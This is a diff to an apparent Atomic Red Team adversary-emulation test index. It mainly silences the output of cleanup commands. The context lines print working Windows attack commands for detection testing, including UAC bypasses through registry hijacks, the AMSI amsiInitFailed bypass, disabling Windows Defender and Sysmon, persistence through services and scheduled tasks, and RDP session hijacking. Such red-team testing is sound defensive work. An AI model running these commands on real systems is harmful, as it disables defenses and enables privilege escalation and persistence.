@@ -3216,8 +3216,8 @@ persistence:
           sc.exe create #{service_name} binPath= #{binary_path}
           sc.exe start #{service_name}
         cleanup_command: |
-          sc.exe stop #{service_name}
-          sc.exe delete #{service_name}
+          sc.exe stop #{service_name} >nul 2>&1
+          sc.exe delete #{service_name} >nul 2>&1
     - name: Service Installation PowerShell
       description: |
         Installs A Local Service via PowerShell.
@@ -3885,7 +3885,7 @@ persistence:
 
 '
         cleanup_command: 'REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-          /V "Atomic Red Team" /f
+          /V "Atomic Red Team" /f >nul 2>&1
 
 '
     - name: Reg Key RunOnce
@@ -3906,7 +3906,7 @@ persistence:
 
 '
         cleanup_command: 'REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
-          /v 1 /f
+          /v 1 /f >nul 2>&1
 
 '
     - name: PowerShell Registry RunOnce
@@ -4059,7 +4059,7 @@ persistence:
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F >nul 2>&1
 
 '
     - name: Scheduled task Remote
@@ -4096,7 +4096,7 @@ persistence:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F >nul 2>&1
 
 '
     - name: Powershell Cmdlet Scheduled Task
@@ -5726,7 +5726,7 @@ defense-evasion:
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
           cmd.exe /c eventvwr.msc
-        cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
+        cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
 
 '
     - name: Bypass UAC using Event Viewer (PowerShell)
@@ -5769,7 +5769,8 @@ defense-evasion:
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
           fodhelper.exe
-        cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f
+        cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f >nul
+          2>&1
 
 '
     - name: Bypass UAC using Fodhelper - PowerShell
@@ -5838,7 +5839,7 @@ defense-evasion:
           copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
           mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
         cleanup_command: |
-          rd "\\?\C:\Windows \" /S /Q
+          rd "\\?\C:\Windows \" /S /Q >nul 2>nul
           del "c:\testbypass.exe" >nul 2>nul
   T1191:
     technique:
@@ -6773,7 +6774,7 @@ defense-evasion:
         name: command_prompt
         elevation_required: false
         command: "#{gup_executable}\n"
-        cleanup_command: 'taskkill /F /IM #{process_name}
+        cleanup_command: 'taskkill /F /IM #{process_name} >nul 2>&1
 
 '
   T1140:
@@ -7130,7 +7131,7 @@ defense-evasion:
         command: 'sysmon -u
 
 '
-        cleanup_command: 'sysmon -i -accepteula
+        cleanup_command: 'sysmon -i -accepteula >nul 2>&1
 
 '
     - name: AMSI Bypass - AMSI InitFailed
@@ -7143,7 +7144,8 @@ defense-evasion:
         name: powershell
         elevation_required: false
         command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
-        cleanup_command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n"
+        cleanup_command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
+          -ErrorAction Ignore\n"
     - name: AMSI Bypass - Remove AMSI Provider Reg Key
       description: |
         With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
@@ -7158,7 +7160,7 @@ defense-evasion:
 
 '
         cleanup_command: 'New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
-          -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
+          -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null
 
 '
     - name: Disable Arbitrary Security Windows Service
@@ -7180,8 +7182,8 @@ defense-evasion:
           net.exe stop #{service_name}
           sc.exe config #{service_name} start= disabled
         cleanup_command: |
-          sc.exe config #{service_name} start= auto
-          net.exe start #{service_name}
+          sc.exe config #{service_name} start= auto >nul 2>&1
+          net.exe start #{service_name} >nul 2>&1
     - name: Disable PowerShell Script Block Logging
       description: |
         An adversary may disable PowerShell Script Block Logging to avoid leaving evidence.
@@ -7248,8 +7250,8 @@ defense-evasion:
           sc config WinDefend start=disabled
           sc query WinDefend
         cleanup_command: |
-          sc start WinDefend
-          sc config WinDefend start=enabled
+          sc start WinDefend >nul 2>&1
+          sc config WinDefend start=enabled >nul 2>&1
     - name: Tamper with Windows Defender Registry
       description: |
         Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be
@@ -11042,7 +11044,10 @@ defense-evasion:
           . $PathToAtomicsFolder\T1093\src\Start-Hollow.ps1
           $ppid=Get-Process #{parent_process_name} | select -expand id
           Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -ParentPID $ppid -Verbose
-        cleanup_command: Stop-Process -Name "#{spawnto_process_name}"
+        cleanup_command: 'Stop-Process -Name "#{spawnto_process_name}" -ErrorAction
+          Ignore
+
+'
   T1055:
     technique:
       x_mitre_permissions_required:
@@ -13753,7 +13758,7 @@ privilege-escalation:
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
           cmd.exe /c eventvwr.msc
-        cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
+        cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
 
 '
     - name: Bypass UAC using Event Viewer (PowerShell)
@@ -13796,7 +13801,8 @@ privilege-escalation:
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
           fodhelper.exe
-        cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f
+        cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f >nul
+          2>&1
 
 '
     - name: Bypass UAC using Fodhelper - PowerShell
@@ -13865,7 +13871,7 @@ privilege-escalation:
           copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
           mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
         cleanup_command: |
-          rd "\\?\C:\Windows \" /S /Q
+          rd "\\?\C:\Windows \" /S /Q >nul 2>nul
           del "c:\testbypass.exe" >nul 2>nul
   T1038:
     technique:
@@ -14652,8 +14658,8 @@ privilege-escalation:
           sc.exe create #{service_name} binPath= #{binary_path}
           sc.exe start #{service_name}
         cleanup_command: |
-          sc.exe stop #{service_name}
-          sc.exe delete #{service_name}
+          sc.exe stop #{service_name} >nul 2>&1
+          sc.exe delete #{service_name} >nul 2>&1
     - name: Service Installation PowerShell
       description: |
         Installs A Local Service via PowerShell.
@@ -15369,7 +15375,7 @@ privilege-escalation:
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F >nul 2>&1
 
 '
     - name: Scheduled task Remote
@@ -15406,7 +15412,7 @@ privilege-escalation:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F >nul 2>&1
 
 '
     - name: Powershell Cmdlet Scheduled Task
@@ -23455,8 +23461,8 @@ execution:
           reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
           iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
         cleanup_command: |
-          cmd /c del /Q /F %SystemRoot%\Temp\art-marker.txt
-          cmd /c REG DELETE "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /f
+          Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
+          Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
     - name: PowerShell Downgrade Attack
       description: 'Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
 
@@ -24094,7 +24100,7 @@ execution:
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F >nul 2>&1
 
 '
     - name: Scheduled task Remote
@@ -24131,7 +24137,7 @@ execution:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F >nul 2>&1
 
 '
     - name: Powershell Cmdlet Scheduled Task
@@ -26423,7 +26429,7 @@ lateral-movement:
           query user
           sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
           net start sesshijack
-        cleanup_command: 'sc.exe delete sesshijack
+        cleanup_command: 'sc.exe delete sesshijack >nul 2>&1
 
 '
     - name: RDPto-DomainController
